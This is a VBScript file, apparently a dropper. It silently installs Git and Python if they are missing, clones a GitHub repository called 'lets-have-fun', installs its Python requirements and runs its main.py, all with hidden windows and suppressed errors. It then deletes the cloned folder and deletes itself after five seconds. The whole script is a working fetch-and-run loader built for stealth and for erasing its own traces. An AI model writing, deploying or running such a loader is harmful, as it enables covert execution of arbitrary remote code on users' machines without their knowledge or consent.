Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
Set oStream = CreateObject("ADODB.Stream")
On Error Resume Next

' Get TEMP path
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
WshShell.CurrentDirectory = tempDir
scriptPath = WScript.ScriptFullName

' Optional Logging (Disabled by default)
logFile = tempDir & "\script_log.txt"
Sub Log(msg)
    ' Uncomment next line to enable logging
    ' Dim log : Set log = objFSO.OpenTextFile(logFile, 8, True) : log.WriteLine msg : log.Close
End Sub

' Check if a command exists
Function CommandExists(cmd)
    Dim exec, output
    Set exec = WshShell.Exec("cmd /c where " & cmd)
    output = exec.StdOut.ReadAll
    CommandExists = (InStr(output, cmd) > 0)
End Function

' Download file with error handling
Function DownloadFile(url, savePath)
    On Error Resume Next
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        oStream.Open
        oStream.Type = 1
        oStream.Write http.ResponseBody
        oStream.SaveToFile savePath, 2
        oStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function

' Install Git if not present
If Not CommandExists("git") Then
    Log "Git not found. Downloading..."
    gitInstaller = tempDir & "\git_installer.exe"
    If Not DownloadFile("https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe", gitInstaller) Then
        Log "Git download failed. Exiting."
        WScript.Quit
    End If
    WshShell.Run gitInstaller & " /VERYSILENT /NORESTART", 0, True
End If

' Install Python if not present
If Not CommandExists("python") Then
    Log "Python not found. Downloading..."
    pythonInstaller = tempDir & "\python_installer.exe"
    If Not DownloadFile("https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe", pythonInstaller) Then
        Log "Python download failed. Exiting."
        WScript.Quit
    End If
    WshShell.Run pythonInstaller & " /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1", 0, True
End If

' Re-validate Python presence
pythonCommand = "python"
If Not CommandExists("python") Then
    pythonCommand = "C:\Python312\python.exe" ' Adjust if needed
    If Not objFSO.FileExists(pythonCommand) Then
        Log "Python installation failed or path issue. Exiting."
        WScript.Quit
    End If
End If

' Check Internet silently
If WshShell.Run("cmd /c ping -n 1 github.com >nul", 0, True) <> 0 Then
    Log "No internet connection. Exiting."
    WScript.Quit
End If

' Clone the repository
WshShell.CurrentDirectory = tempDir
gitCloneCommand = "git clone https://github.com/DarkImpact1/lets-have-fun.git"
If WshShell.Run(gitCloneCommand, 0, True) <> 0 Then
    Log "Git clone failed. Exiting."
    WScript.Quit
End If

' Install Python requirements
WshShell.CurrentDirectory = tempDir & "\lets-have-fun"
If WshShell.Run(pythonCommand & " -m pip install -r requirements.txt", 0, True) <> 0 Then
    Log "Failed to install Python requirements. Exiting."
    WScript.Quit
End If

' Run Python Script
If WshShell.Run(pythonCommand & " main.py", 0, True) <> 0 Then
    Log "Python script execution failed."
End If

' Cleanup repository folder
On Error Resume Next
WshShell.CurrentDirectory = tempDir
WshShell.Run "cmd /c rd /s /q lets-have-fun", 0, True

' Self-delete after 5 seconds
WshShell.Run "cmd /c timeout 5 >nul && del " & Chr(34) & scriptPath & Chr(34), 0

' Cleanup objects
Set WshShell = Nothing
Set objFSO = Nothing
Set http = Nothing
Set oStream = Nothing
